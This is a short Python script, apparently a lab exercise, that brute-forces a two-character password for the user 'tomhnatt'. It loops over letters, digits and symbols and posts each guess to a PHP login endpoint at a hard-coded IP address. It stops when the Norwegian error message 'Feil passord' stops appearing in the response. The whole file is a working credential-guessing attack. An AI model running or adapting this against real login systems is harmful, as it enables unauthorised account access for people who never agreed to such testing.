import string
import requests


chars = string.ascii_letters + string.digits + '!"#¤%&/()'
for n in chars:
  for m in chars:
    password = "".join(n + m)
    url = "http://158.39.188.210/functions/passcheck10.php?username=tomhnatt&password=" + password

    response = requests.post(url)
    sjekk = "Feil passord"
    check = sjekk.encode()

    if check not in response.content:
        print("The correct password is: " + password)
        break

  if check not in response.content:
      break










